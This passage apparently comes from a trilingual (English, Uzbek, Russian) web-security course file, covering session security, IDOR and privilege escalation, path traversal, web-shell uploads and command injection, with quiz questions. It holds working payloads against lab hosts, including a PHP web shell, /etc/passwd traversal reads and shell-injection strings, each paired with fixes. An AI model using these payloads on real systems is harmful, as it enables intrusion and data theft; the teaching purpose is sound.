- **Сменяемым при входе** — иначе возможна *фиксация сессии*: атакующий задаёт ID сессии жертвы до входа, а затем едет на уже аутентифицированной сессии.
- **Аннулируемым при выходе** — токен, работающий после выхода, можно воспроизвести.

Соберите несколько токенов и посмотрите на них. Инкрементируются? Общий префикс? Кодируют имя в base64? Любая структура — слабость.

## Флаги cookie, снова, потому что они важны

```
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict
```

- **HttpOnly** — JavaScript не читает, притупляя кражу через XSS
- **Secure** — никогда не по обычному HTTP, так что наблюдатель в сети не перехватит
- **SameSite** — не отправляется в межсайтовых запросах, притупляя CSRF

Сессионная cookie без `HttpOnly` или `Secure` — уже находка, проверяемая одной строкой:

```
$ curl -sI target.local/login | grep -i set-cookie
```

## Сброс пароля: боковая дверь

Поток сброса — тоже аутентификация, и часто самое слабое звено. Ищите:

- Предсказуемые токены сброса (последовательные, на метке времени, короткие)
- Токен, который никогда не истекает или используется повторно
- Идентификатор учётки берётся из тела запроса, позволяя сбросить *другого* пользователя
- Ссылка сброса утекает через заголовок `Referer` на сторонние ресурсы страницы

Надёжный сброс использует длинный случайный, одноразовый, короткоживущий токен, привязанный на сервере к учётке, — и никогда не доверяет id пользователя, присланному рядом.

## Попробуйте (на своей лаборатории)

1. Отправьте вход для существующего и несуществующего пользователя. Отличаются ли ответы текстом или временем?
2. Войдите, захватите cookie сессии, выйдите, затем воспроизведите старую cookie. Работает ли она?
3. Соберите несколько свежих токенов. Есть ли между ними видимый паттерн?""",
        "questions": [
            q("Why is a login that says 'No such user' vs 'Invalid password' a flaw?",
              "Nega 'Bunday foydalanuvchi yo'q' va 'Noto'g'ri parol' deb aytadigan kirish nuqson?",
              "Почему логин, говорящий 'Нет такого пользователя' против 'Неверный пароль', — дефект?",
              ["It lets an attacker enumerate which usernames exist",
               "It reveals the password hash", "It disables rate limiting",
               "It is not a flaw at all"],
              ["U hujumchiga qaysi foydalanuvchi nomlari mavjudligini sanash imkonini beradi",
               "U parol xeshini oshkor qiladi", "U tezlik cheklashni o'chiradi",
               "Bu umuman nuqson emas"],
              ["Позволяет атакующему перечислить существующие имена",
               "Раскрывает хеш пароля", "Отключает ограничение частоты",
               "Это вообще не дефект"], 0),
            q("What is session fixation?",
              "Sessiya fiksatsiyasi nima?",
              "Что такое фиксация сессии?",
              ["An attacker sets the victim's session ID before login, then reuses it after",
               "The server rotates tokens too often", "A session that never expires",
               "Encrypting the session cookie"],
              ["Hujumchi kirishdan oldin jabrlanuvchining sessiya ID'sini o'rnatadi, keyin uni ishlatadi",
               "Server tokenlarni juda tez almashtiradi", "Hech qachon tugamaydigan sessiya",
               "Sessiya cookie'sini shifrlash"],
              ["Атакующий задаёт ID сессии жертвы до входа, затем использует после",
               "Сервер слишком часто меняет токены", "Сессия, которая не истекает",
               "Шифрование cookie сессии"], 0),
            q("A session cookie still works after the user logs out. This means:",
              "Foydalanuvchi chiqqandan keyin ham sessiya cookie'si ishlaydi. Bu nimani bildiradi:",
              "Cookie сессии работает после выхода пользователя. Это значит:",
              ["The token is not invalidated on logout and can be replayed",
               "The user did not really log out", "The cookie is encrypted",
               "The server is behaving correctly"],
              ["Token chiqishda bekor qilinmaydi va qayta ishlatilishi mumkin",
               "Foydalanuvchi aslida chiqmagan", "Cookie shifrlangan",
               "Server to'g'ri ishlayapti"],
              ["Токен не аннулируется при выходе и может быть воспроизведён",
               "Пользователь на самом деле не вышел", "Cookie зашифрована",
               "Сервер работает правильно"], 0),
        ],
    },
    # ---------------------------------------------------------------- 6
    {
        "category": "web", "points": 80,
        "title": "Access control: IDOR and privilege flaws",
        "titleUz": "Kirish nazorati: IDOR va imtiyoz nuqsonlari",
        "titleRu": "Контроль доступа: IDOR и дефекты привилегий",
        "content": r"""Broken access control is the flaw that tops the OWASP list, and it needs no clever payload. The application authenticates you correctly, then fails to check whether *this* user may touch *this* resource. You simply ask for something that is not yours, and the server hands it over.

## IDOR: Insecure Direct Object Reference

The pattern is everywhere. Your own invoice is at:

```
https://shop.local/invoice?id=1043
```

The server showed it because you were logged in. But did it check that invoice 1043 belongs to *you*? Change the number:

```
https://shop.local/invoice?id=1044
```

If 1044 is someone else's invoice and you can read it, that is IDOR. The reference (`1044`) points directly at an object, and nothing verifies your right to it. It appears with numeric IDs, usernames, filenames, UUIDs in the URL — anywhere a resource is named by a value the user can change.

The test is exactly as simple as it sounds:

```
$ curl -s -b "session=YOURS" "https://shop.local/invoice?id=1043"   # yours: 200, your data
$ curl -s -b "session=YOURS" "https://shop.local/invoice?id=1044"   # someone else's?
```

If the second returns another user's data, you have it. Automate the range and you have everyone's:

```
$ for id in $(seq 1040 1050); do
    echo -n "$id: "
    curl -s -b "session=YOURS" "https://shop.local/invoice?id=$id" | grep -o "Customer: [A-Za-z ]*"
  done
```

## Vertical vs horizontal

- **Horizontal** — reaching another user *at your level*: reading their invoice, editing their profile. IDOR is usually horizontal.
- **Vertical** — reaching a *higher* level: a normal user performing admin actions.

Vertical escalation often hides in plain sight. The admin panel link is missing from your menu — but the menu is client side. The endpoint may still answer:

```
$ curl -s -b "session=NORMAL_USER" "https://shop.local/admin/users"
```

If that returns the user list to a non-admin, the check was only ever in the navigation, not on the server. "Hidden" is not "protected".

## Forced browsing and method tampering

Access control can differ by path or by HTTP method:

```
$ curl -b "session=USER" https://shop.local/admin            # 302 to login — looks protected
$ curl -b "session=USER" https://shop.local/admin/config.json  # 200 — the API forgot to check
```

```
$ curl -X GET  -b "session=USER" https://shop.local/api/user/5   # 403
$ curl -X DELETE -b "session=USER" https://shop.local/api/user/5 # 200 — only GET was guarded
```

A control applied to one method or one path, but not its siblings, is a classic gap. Test every method the endpoint accepts, not just the one the UI uses.

## Mass assignment

Some frameworks bind request fields straight onto an object. Send a field the form never showed:

```
$ curl -X POST -b "session=USER" https://shop.local/api/profile \
    -H "Content-Type: application/json" \
    -d '{"name":"Alice","role":"admin"}'
```

If the server updates `role` because it blindly accepted every key, you have just promoted yourself. The form only offered `name`; the server should only have accepted `name`.

## The fix

- Check authorisation on **every** request, at the server, for the **specific** object — not "are you logged in" but "may *you* touch *this*".
- Derive the user's identity from the session, never from a parameter in the request.
- Deny by default; grant access explicitly.
- Prefer unguessable identifiers (UUIDs) so enumeration is harder — but treat that as depth, not the control itself. An authorisation check is the control; unpredictable IDs only slow down the search.

## Try it (on a lab you own)

1. Find a URL with a numeric `id` for one of your own objects. Change it by one. What comes back?
2. Find an admin-only action and call its endpoint directly as a normal user.
3. Take a working GET request and repeat it as POST, PUT and DELETE. Do they all enforce the same check?""",
        "contentUz": r"""Buzilgan kirish nazorati — OWASP ro'yxatining boshidagi nuqson va u hech qanday ayyor payload talab qilmaydi. Ilova sizni to'g'ri autentifikatsiya qiladi, keyin *bu* foydalanuvchi *bu* resursga tegishi mumkinmi — buni tekshirmaydi. Siz shunchaki o'zingizniki bo'lmagan narsani so'raysiz, server esa uni beradi.

## IDOR: Xavfsiz bo'lmagan to'g'ridan-to'g'ri obyekt havolasi

Naqsh hamma joyda. O'zingizning hisob-fakturangiz:

```
https://shop.local/invoice?id=1043
```

Server uni ko'rsatdi, chunki siz tizimga kirgansiz. Lekin u 1043 hisob-faktura *sizga* tegishli ekanini tekshirdimi? Raqamni o'zgartiring:

```
https://shop.local/invoice?id=1044
```

Agar 1044 boshqa birovning hisob-fakturasi bo'lsa va siz uni o'qiy olsangiz — bu IDOR. Havola (`1044`) to'g'ridan-to'g'ri obyektga ishora qiladi va sizning huquqingizni hech narsa tekshirmaydi. U raqamli ID'lar, foydalanuvchi nomlari, fayl nomlari, URL'dagi UUID'lar bilan paydo bo'ladi — resurs foydalanuvchi o'zgartira oladigan qiymat bilan nomlangan har qanday joyda.

Sinov aynan eshitilgandek oddiy:

```
$ curl -s -b "session=SIZNIKI" "https://shop.local/invoice?id=1043"   # sizniki: 200, ma'lumotingiz
$ curl -s -b "session=SIZNIKI" "https://shop.local/invoice?id=1044"   # boshqa birovniki?
```

Agar ikkinchisi boshqa foydalanuvchi ma'lumotini qaytarsa — sizda bor. Diapazonni avtomatlashtiring — hammaniki sizda:

```
$ for id in $(seq 1040 1050); do
    echo -n "$id: "
    curl -s -b "session=SIZNIKI" "https://shop.local/invoice?id=$id" | grep -o "Customer: [A-Za-z ]*"
  done
```

## Vertikal va gorizontal

- **Gorizontal** — *o'z darajangizdagi* boshqa foydalanuvchiga yetish: uning hisob-fakturasini o'qish, profilini tahrirlash. IDOR odatda gorizontal.
- **Vertikal** — *yuqori* darajaga yetish: oddiy foydalanuvchi admin harakatlarini bajarishi.

Vertikal ko'tarilish ko'pincha ko'z oldida yashiringan. Admin panel havolasi menyungizda yo'q — lekin menyu mijoz tomonida. Endpoint baribir javob berishi mumkin:

```
$ curl -s -b "session=ODDIY_FOYDALANUVCHI" "https://shop.local/admin/users"
```

Agar bu admin bo'lmaganga foydalanuvchilar ro'yxatini qaytarsa, tekshiruv faqat navigatsiyada bo'lgan, serverда emas. "Yashirin" — "himoyalangan" degani emas.

## Majburiy ko'rish va metodni buzish

Kirish nazorati yo'l yoki HTTP metodi bo'yicha farq qilishi mumkin:

```
$ curl -b "session=USER" https://shop.local/admin            # login'ga 302 — himoyalangandek
$ curl -b "session=USER" https://shop.local/admin/config.json  # 200 — API tekshirishni unutdi
```

```
$ curl -X GET  -b "session=USER" https://shop.local/api/user/5   # 403
$ curl -X DELETE -b "session=USER" https://shop.local/api/user/5 # 200 — faqat GET himoyalangan
```

Bitta metodga yoki bitta yo'lga qo'llangan, lekin qardoshlariga qo'llanmagan nazorat — klassik bo'shliq. Endpoint qabul qiladigan har bir metodni sinang, faqat UI ishlatganini emas.

## Ommaviy tayinlash (mass assignment)

Ba'zi freymvorklar so'rov maydonlarini to'g'ridan-to'g'ri obyektga bog'laydi. Forma hech qachon ko'rsatmagan maydonni yuboring:

```
$ curl -X POST -b "session=USER" https://shop.local/api/profile \
    -H "Content-Type: application/json" \
    -d '{"name":"Alice","role":"admin"}'
```

Agar server har bir kalitni ko'r-ko'rona qabul qilgani uchun `role` ni yangilasa — siz o'zingizni endigina ko'tardingiz. Forma faqat `name` ni taklif qildi; server faqat `name` ni qabul qilishi kerak edi.

## Tuzatish

- Avtorizatsiyani **har bir** so'rovda, serverда, **aniq** obyekt uchun tekshiring — "kirdingizmi" emas, "*siz* *bunga* tega olasizmi".
- Foydalanuvchi shaxsini sessiyadan oling, hech qachon so'rovdagi parametrdan emas.
- Sukut bo'yicha rad eting; kirishni aniq bering.
- Taxmin qilib bo'lmaydigan identifikatorlarni (UUID) afzal ko'ring, shunda sanash qiyinroq — lekin buni chuqurlik deb bilib, nazoratning o'zi deb emas. Nazorat — avtorizatsiya tekshiruvi; taxmin qilib bo'lmas ID'lar faqat qidiruvni sekinlashtiradi.

## Sinab ko'ring (o'z laboratoriyangizda)

1. O'z obyektlaringizdan biri uchun raqamli `id` li URL toping. Uni bittaga o'zgartiring. Nima qaytadi?
2. Faqat admin uchun harakat toping va uning endpointini oddiy foydalanuvchi sifatida to'g'ridan-to'g'ri chaqiring.
3. Ishlaydigan GET so'rovini oling va uni POST, PUT va DELETE sifatida takrorlang. Ular hammasi bir xil tekshiruvni amalga oshiradimi?""",
        "contentRu": r"""Сломанный контроль доступа — дефект во главе списка OWASP, и ему не нужен хитрый пейлоад. Приложение аутентифицирует вас правильно, а затем не проверяет, может ли *этот* пользователь трогать *этот* ресурс. Вы просто просите не своё, и сервер отдаёт.

## IDOR: небезопасная прямая ссылка на объект

Паттерн повсюду. Ваш собственный счёт:

```
https://shop.local/invoice?id=1043
```

Сервер показал его, потому что вы вошли. Но проверил ли он, что счёт 1043 принадлежит *вам*? Смените число:

```
https://shop.local/invoice?id=1044
```

Если 1044 — чужой счёт и вы можете его прочитать, это IDOR. Ссылка (`1044`) указывает прямо на объект, и ничто не проверяет ваше право на него. Встречается с числовыми ID, логинами, именами файлов, UUID в URL — везде, где ресурс назван значением, которое пользователь может изменить.

Проверка ровно так проста, как звучит:

```
$ curl -s -b "session=ВАША" "https://shop.local/invoice?id=1043"   # ваш: 200, ваши данные
$ curl -s -b "session=ВАША" "https://shop.local/invoice?id=1044"   # чужой?
```

Если второй вернул данные другого пользователя — оно у вас. Автоматизируйте диапазон — и у вас данные всех:

```
$ for id in $(seq 1040 1050); do
    echo -n "$id: "
    curl -s -b "session=ВАША" "https://shop.local/invoice?id=$id" | grep -o "Customer: [A-Za-z ]*"
  done
```

## Вертикальный против горизонтального

- **Горизонтальный** — дотянуться до другого пользователя *своего уровня*: прочитать его счёт, изменить профиль. IDOR обычно горизонтален.
- **Вертикальный** — дотянуться до *более высокого* уровня: обычный пользователь выполняет действия админа.

Вертикальное повышение часто прячется на виду. Ссылки на админ-панель нет в вашем меню — но меню клиентское. Эндпоинт всё равно может отвечать:

```
$ curl -s -b "session=ОБЫЧНЫЙ" "https://shop.local/admin/users"
```

Если это вернуло список пользователей не-админу, проверка была только в навигации, не на сервере. «Скрыто» не значит «защищено».

## Принудительный обход и подмена метода

Контроль доступа может отличаться по пути или по HTTP-методу:

```
$ curl -b "session=USER" https://shop.local/admin            # 302 на логин — выглядит защищённым
$ curl -b "session=USER" https://shop.local/admin/config.json  # 200 — API забыл проверить
```

```
$ curl -X GET  -b "session=USER" https://shop.local/api/user/5   # 403
$ curl -X DELETE -b "session=USER" https://shop.local/api/user/5 # 200 — защитили только GET
```

Контроль на одном методе или пути, но не на соседних, — классический пробел. Тестируйте каждый метод, который принимает эндпоинт, а не только тот, что использует UI.

## Массовое присваивание

Некоторые фреймворки привязывают поля запроса прямо к объекту. Отправьте поле, которого форма не показывала:

```
$ curl -X POST -b "session=USER" https://shop.local/api/profile \
    -H "Content-Type: application/json" \
    -d '{"name":"Alice","role":"admin"}'
```

Если сервер обновит `role`, слепо приняв каждый ключ, вы только что повысили себя. Форма предлагала только `name`; сервер должен был принять только `name`.

## Исправление

- Проверяйте авторизацию на **каждом** запросе, на сервере, для **конкретного** объекта — не «вошли ли вы», а «можете ли *вы* трогать *это*».
- Берите личность пользователя из сессии, никогда из параметра запроса.
- Запрещайте по умолчанию; давайте доступ явно.
- Предпочитайте неугадываемые идентификаторы (UUID), чтобы перебор был труднее, — но считайте это глубиной, а не самим контролем. Контроль — это проверка авторизации; непредсказуемые ID лишь замедляют поиск.

## Попробуйте (на своей лаборатории)

1. Найдите URL с числовым `id` для одного из своих объектов. Измените на единицу. Что вернулось?
2. Найдите действие только для админа и вызовите его эндпоинт напрямую обычным пользователем.
3. Возьмите рабочий GET-запрос и повторите как POST, PUT и DELETE. Все ли применяют одну проверку?""",
        "questions": [
            q("What defines an IDOR vulnerability?",
              "IDOR zaifligini nima ta'riflaydi?",
              "Что определяет уязвимость IDOR?",
              ["Accessing another user's object by changing a reference the server does not authorise",
               "Injecting SQL into a query", "Running JavaScript in a victim's browser",
               "Brute-forcing a password"],
              ["Server avtorizatsiya qilmagan havolani o'zgartirib, boshqa foydalanuvchi obyektiga kirish",
               "So'rovga SQL kiritish", "Jabrlanuvchi brauzerida JavaScript ishlatish",
               "Parolni brute-force qilish"],
              ["Доступ к чужому объекту сменой ссылки, которую сервер не авторизует",
               "Инъекция SQL в запрос", "Запуск JavaScript в браузере жертвы",
               "Перебор пароля"], 0),
            q("A normal user's session can call `/admin/users` directly and gets the list. This is:",
              "Oddiy foydalanuvchi sessiyasi `/admin/users` ni to'g'ridan-to'g'ri chaqirib ro'yxatni oladi. Bu:",
              "Сессия обычного пользователя вызывает `/admin/users` напрямую и получает список. Это:",
              ["Vertical privilege escalation — the check was only in the UI",
               "A correctly working access control", "Horizontal access only",
               "An XSS vulnerability"],
              ["Vertikal imtiyoz ko'tarilishi — tekshiruv faqat UI'da edi",
               "To'g'ri ishlaydigan kirish nazorati", "Faqat gorizontal kirish",
               "XSS zaifligi"],
              ["Вертикальное повышение привилегий — проверка была только в UI",
               "Правильно работающий контроль доступа", "Только горизонтальный доступ",
               "Уязвимость XSS"], 0),
            q("Where should the server get the acting user's identity from?",
              "Server harakat qilayotgan foydalanuvchi shaxsini qayerdan olishi kerak?",
              "Откуда сервер должен брать личность действующего пользователя?",
              ["From the authenticated session, never from a request parameter",
               "From a hidden form field", "From the URL id parameter",
               "From the User-Agent header"],
              ["Autentifikatsiyalangan sessiyadan, hech qachon so'rov parametridan emas",
               "Yashirin forma maydonidan", "URL id parametridan",
               "User-Agent sarlavhasidan"],
              ["Из аутентифицированной сессии, никогда из параметра запроса",
               "Из скрытого поля формы", "Из параметра id в URL",
               "Из заголовка User-Agent"], 0),
        ],
    },
    # ---------------------------------------------------------------- 7
    {
        "category": "web", "points": 80,
        "title": "File uploads, path traversal, and command injection",
        "titleUz": "Fayl yuklash, yo'ldan chiqish va buyruq in'ektsiyasi",
        "titleRu": "Загрузка файлов, обход пути и инъекция команд",
        "content": r"""These three flaws share a theme: input that reaches the *operating system* — as a file it writes, a path it opens, or a command it runs. When it does, the consequence is usually code execution on the server, the most serious outcome on the web.

## Path traversal

A page fetches a file by name:

```
https://target.local/download?file=report.pdf
```

If the code does something like `read("/var/files/" + file)`, then `..` walks up the tree:

```
?file=../../../../etc/passwd
```

`../` escapes `/var/files/` one level at a time; enough of them reach the root and then descend to any file the server process can read:

```
$ curl "https://target.local/download?file=../../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

Naive filters that strip `../` are bypassed with encoding — `%2e%2e%2f` is `../` URL-encoded, and `....//` collapses to `../` after a single-pass strip. The fix is not filtering: **resolve the final path and confirm it stays inside the intended directory**, and prefer a fixed allow-list of filenames over accepting a path at all.

## File upload to code execution

An upload that accepts the wrong kind of file, in a place the server will execute it, is remote code execution. Upload a web shell:

```php
<?php system($_GET['cmd']); ?>
```

Save it as `shell.php`, upload it, then:

```
$ curl "https://target.local/uploads/shell.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

You are now running commands as the web server user. Weak checks and their bypasses:

- Checking the extension only → rename to `shell.php`, `shell.phtml`, `shell.php.jpg` depending on server config
- Checking the `Content-Type` header → it is set by the client; forge it to `image/png`
- Checking "magic bytes" at the start → prepend a real PNG header, keep the PHP after it

The real fixes: store uploads outside the web root so they are served, never executed; rename to a random server-chosen name; validate type properly; and never let the upload directory run scripts.

## Command injection

The most dangerous of the three: input reaches a shell command. A "ping this host" feature might run:

```
ping -c 1 <user input>
```

Shell metacharacters turn one command into two:

```
?host=127.0.0.1; id
?host=127.0.0.1 && id
?host=127.0.0.1 | id
?host=$(id)
```

```
$ curl "https://target.local/ping?host=127.0.0.1;id"
PING 127.0.0.1 ... 1 packets transmitted
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The `;` ends the ping and starts your command. `&&`, `|`, `$()` and backticks all achieve the same in different contexts. When output is not shown, fall back to the same blind techniques as SQL injection — a time delay proves execution:

```
?host=127.0.0.1; sleep 5
```

Five seconds of hang confirms your command ran.

## The one fix that covers all three

Do not pass untrusted input to a shell at all. Use language APIs that take arguments as a list, so the input can never be reinterpreted as syntax:

```
# dangerous — the whole string goes to a shell
os.system("ping -c 1 " + host)

# safe — host is one argument, never parsed as a command
subprocess.run(["ping", "-c", "1", host])
```

This is the same lesson as parameterised SQL, in a different place: keep **data** and **code** in separate channels, and the injection has nowhere to live. Where a shell is truly unavoidable, use a strict allow-list of permitted values — never a block-list of bad characters, which attackers reliably out-think.

## Try it (on a lab you own)

1. Find a `file=` parameter and try `../` sequences. Can you read outside the intended folder?
2. On DVWA's command-injection page, append `;id` to the host and read the output.
3. Try the same with `; sleep 5` where no output is shown. Does the response hang?""",
        "contentUz": r"""Bu uch nuqson bitta mavzuni bo'lishadi: *operatsion tizimga* yetadigan kirish — u yozadigan fayl, ochadigan yo'l yoki ishga tushiradigan buyruq sifatida. Shunday bo'lganda oqibat odatda serverда kod bajarilishi — vebdagi eng jiddiy natija.

## Yo'ldan chiqish (path traversal)

Sahifa faylni nomi bo'yicha oladi:

```
https://target.local/download?file=report.pdf
```

Agar kod `read("/var/files/" + file)` kabi bir narsa qilsa, `..` daraxt bo'ylab yuqoriga chiqadi:

```
?file=../../../../etc/passwd
```

`../` `/var/files/` dan bir vaqtda bir pog'ona chiqadi; yetarlicha ko'p bo'lsa ildizga yetadi va keyin server jarayoni o'qiy oladigan istalgan faylga tushadi:

```
$ curl "https://target.local/download?file=../../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

`../` ni kesadigan sodda filtrlarni kodlash bilan chetlab o'tiladi — `%2e%2e%2f` bu URL-kodlangan `../`, va `....//` bir marta kesilgandan keyin `../` ga aylanadi. Tuzatish filtrlash emas: **yakuniy yo'lni yeching va u mo'ljallangan katalog ichida qolishini tasdiqlang**, va yo'lni umuman qabul qilishdan ko'ra belgilangan ruxsat berilgan fayl nomlari ro'yxatini afzal ko'ring.

## Fayl yuklashdan kod bajarishga

Noto'g'ri turdagi faylni server bajaradigan joyga qabul qiladigan yuklash — masofaviy kod bajarilishi. Veb-shell yuklang:

```php
<?php system($_GET['cmd']); ?>
```

Uni `shell.php` sifatida saqlang, yuklang, keyin:

```
$ curl "https://target.local/uploads/shell.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Endi siz veb-server foydalanuvchisi sifatida buyruq ishlatyapsiz. Zaif tekshiruvlar va ularni chetlab o'tishlar:

- Faqat kengaytmani tekshirish → server sozlamasiga qarab `shell.php`, `shell.phtml`, `shell.php.jpg` ga qayta nomlang
- `Content-Type` sarlavhasini tekshirish → uni mijoz o'rnatadi; `image/png` ga soxtalashtiring
- Boshidagi "sehrli baytlar"ni tekshirish → oldiga haqiqiy PNG sarlavhasini qo'ying, PHP'ni undan keyin saqlang

Haqiqiy tuzatishlar: yuklamalarni veb-ildizdan tashqarida saqlang, shunda ular beriladi, hech qachon bajarilmaydi; server tanlagan tasodifiy nomga o'zgartiring; turini to'g'ri tekshiring; va yuklash katalogiga skript ishlatishga ruxsat bermang.

## Buyruq in'ektsiyasi

Uchtasining eng xavflisi: kirish shell buyrug'iga yetadi. "Bu xostni ping qil" xususiyati shuni ishlatishi mumkin:

```
ping -c 1 <foydalanuvchi kirishi>
```

Shell metabelgilari bitta buyruqni ikkiga aylantiradi:

```
?host=127.0.0.1; id
?host=127.0.0.1 && id
?host=127.0.0.1 | id
?host=$(id)
```

```
$ curl "https://target.local/ping?host=127.0.0.1;id"
PING 127.0.0.1 ... 1 packets transmitted
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`;` ping'ni tugatib, sizning buyrug'ingizni boshlaydi. `&&`, `|`, `$()` va teskari tirnoqlar turli kontekstlarda xuddi shunga erishadi. Chiqish ko'rsatilmasa, SQL in'ektsiyadagi kabi ko'r texnikaga qayting — vaqt kechikishi bajarilishni isbotlaydi:

```
?host=127.0.0.1; sleep 5
```

Besh soniyalik osilib qolish buyrug'ingiz ishlaganini tasdiqlaydi.

## Uchalasini qamraydigan bitta tuzatish

Ishonchsiz kirishni shell'ga umuman uzatmang. Argumentlarni ro'yxat sifatida qabul qiladigan til API'laridan foydalaning, shunda kirishni hech qachon sintaksis sifatida qayta talqin qilib bo'lmaydi:

```
# xavfli — butun satr shell'ga boradi
os.system("ping -c 1 " + host)

# xavfsiz — host bitta argument, hech qachon buyruq sifatida tahlil qilinmaydi
subprocess.run(["ping", "-c", "1", host])
```

Bu — parametrlangan SQL bilan bir xil dars, boshqa joyda: **ma'lumot** va **kod**ni alohida kanallarda saqlang, va in'ektsiyaga yashaydigan joy qolmaydi. Shell chindan muqarrar bo'lgan joyda ruxsat berilgan qiymatlarning qat'iy ro'yxatidan foydalaning — hech qachon yomon belgilarning taqiq ro'yxatidan emas, hujumchilar uni ishonchli ravishda aylanib o'tadi.

## Sinab ko'ring (o'z laboratoriyangizda)

1. `file=` parametrini toping va `../` ketma-ketligini sinang. Mo'ljallangan papkadan tashqarini o'qiy olasizmi?
2. DVWA'ning buyruq in'ektsiyasi sahifasida xostga `;id` qo'shing va chiqishni o'qing.
3. Chiqish ko'rsatilmaydigan joyda `; sleep 5` bilan xuddi shuni sinang. Javob osilib qoladimi?""",
        "contentRu": r"""Эти три дефекта объединяет тема: ввод, доходящий до *операционной системы* — как файл, который она пишет, путь, который открывает, или команда, которую выполняет. Когда так происходит, следствие обычно — выполнение кода на сервере, самый серьёзный исход в вебе.

## Обход пути (path traversal)

Страница берёт файл по имени:

```
https://target.local/download?file=report.pdf
```

Если код делает что-то вроде `read("/var/files/" + file)`, то `..` идёт вверх по дереву:

```
?file=../../../../etc/passwd
```

`../` выходит из `/var/files/` по уровню за раз; их хватит, чтобы дойти до корня и спуститься к любому файлу, доступному процессу сервера:

```
$ curl "https://target.local/download?file=../../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

Наивные фильтры, вырезающие `../`, обходятся кодировкой — `%2e%2e%2f` это `../` в URL-кодировке, а `....//` схлопывается в `../` после одного прохода. Исправление не в фильтрации: **разрешите итоговый путь и убедитесь, что он остаётся внутри нужного каталога**, а лучше используйте фиксированный allow-list имён вместо приёма пути вообще.

## От загрузки файла к выполнению кода

Загрузка, принимающая не тот тип файла в место, где сервер его выполнит, — это удалённое выполнение кода. Загрузите веб-шелл:

```php
<?php system($_GET['cmd']); ?>
```

Сохраните как `shell.php`, загрузите, затем:

```
$ curl "https://target.local/uploads/shell.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Теперь вы выполняете команды от пользователя веб-сервера. Слабые проверки и их обходы:

- Проверка только расширения → переименовать в `shell.php`, `shell.phtml`, `shell.php.jpg` в зависимости от конфигурации
- Проверка заголовка `Content-Type` → его задаёт клиент; подделайте под `image/png`
- Проверка «магических байтов» в начале → допишите настоящий заголовок PNG, PHP оставьте после

Настоящие исправления: храните загрузки вне веб-корня, чтобы их отдавали, а не исполняли; переименовывайте в случайное серверное имя; правильно проверяйте тип; и не давайте каталогу загрузок выполнять скрипты.

## Инъекция команд

Опаснейшая из трёх: ввод доходит до команды оболочки. Функция «пропинговать хост» может выполнять:

```
ping -c 1 <ввод пользователя>
```

Метасимволы оболочки превращают одну команду в две:

```
?host=127.0.0.1; id
?host=127.0.0.1 && id
?host=127.0.0.1 | id
?host=$(id)
```

```
$ curl "https://target.local/ping?host=127.0.0.1;id"
PING 127.0.0.1 ... 1 packets transmitted
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`;` завершает ping и запускает вашу команду. `&&`, `|`, `$()` и обратные кавычки достигают того же в разных контекстах. Когда вывод не показан, вернитесь к тем же слепым техникам, что в SQL-инъекции — задержка доказывает выполнение:

```
?host=127.0.0.1; sleep 5
```

Зависание на пять секунд подтверждает, что команда выполнилась.

## Одно исправление, покрывающее все три

Не передавайте недоверенный ввод в оболочку вообще. Используйте API языка, принимающие аргументы списком, чтобы ввод нельзя было переистолковать как синтаксис:

```
# опасно — вся строка уходит в оболочку
os.system("ping -c 1 " + host)

# безопасно — host это один аргумент, не разбираемый как команда
subprocess.run(["ping", "-c", "1", host])
```

Это тот же урок, что параметризованный SQL, в другом месте: держите **данные** и **код** в разных каналах, и инъекции негде жить. Где оболочка действительно неизбежна, используйте строгий allow-list допустимых значений — никогда не block-list плохих символов, который атакующие надёжно переигрывают.

## Попробуйте (на своей лаборатории)

1. Найдите параметр `file=` и попробуйте последовательности `../`. Читается ли что-то вне нужной папки?
2. На странице инъекции команд в DVWA добавьте `;id` к хосту и прочитайте вывод.
3. Попробуйте то же с `; sleep 5`, где вывода нет. Зависает ли ответ?""",
        "questions": [
            q("What does `?file=../../../../etc/passwd` attempt?",
              "`?file=../../../../etc/passwd` nimaga urinadi?",
              "Что пытается сделать `?file=../../../../etc/passwd`?",
              ["Path traversal — escaping the intended directory to read arbitrary files",
               "SQL injection", "Cross-site scripting", "Uploading a web shell"],
              ["Yo'ldan chiqish — ixtiyoriy fayllarni o'qish uchun mo'ljallangan katalogdan chiqish",
               "SQL in'ektsiya", "Saytlararo skript", "Veb-shell yuklash"],
              ["Обход пути — выход из нужного каталога для чтения произвольных файлов",
               "SQL-инъекцию", "Межсайтовый скриптинг", "Загрузку веб-шелла"], 0),
            q("Why is checking a file's Content-Type header an inadequate upload defence?",
              "Nega faylning Content-Type sarlavhasini tekshirish yuklash uchun yetarsiz himoya?",
              "Почему проверка заголовка Content-Type файла — недостаточная защита загрузки?",
              ["The client sets it and can forge it", "Content-Type is always accurate",
               "The server strips it automatically", "It only matters for images"],
              ["Uni mijoz o'rnatadi va soxtalashtira oladi", "Content-Type doim aniq",
               "Server uni avtomatik kesadi", "U faqat rasmlar uchun muhim"],
              ["Его задаёт клиент и может подделать", "Content-Type всегда точен",
               "Сервер вырезает его автоматически", "Он важен только для картинок"], 0),
            q("What is the general fix for command injection?",
              "Buyruq in'ektsiyasining umumiy tuzatishi nima?",
              "Каково общее исправление инъекции команд?",
              ["Pass arguments as a list to an API, never build a shell string",
               "Escape semicolons in the input", "Run the command as a lower-privileged user",
               "Hide the command output"],
              ["Argumentlarni API'ga ro'yxat sifatida uzating, hech qachon shell satri qurmang",
               "Kirishda nuqta-vergullarni qochiring", "Buyruqni past imtiyozli foydalanuvchi sifatida ishga tushiring",
               "Buyruq chiqishini yashiring"],
              ["Передавать аргументы списком в API, никогда не строить строку оболочки",
               "Экранировать точки с запятой во вводе", "Запускать команду от менее привилегированного пользователя",
               "Скрыть вывод команды"], 0),
        ],
    },
    # ---------------------------------------------------------------- 8
    {
        "category": "web", "points": 80,
        "title": "CSRF, SSRF, and using a proxy to see everything",
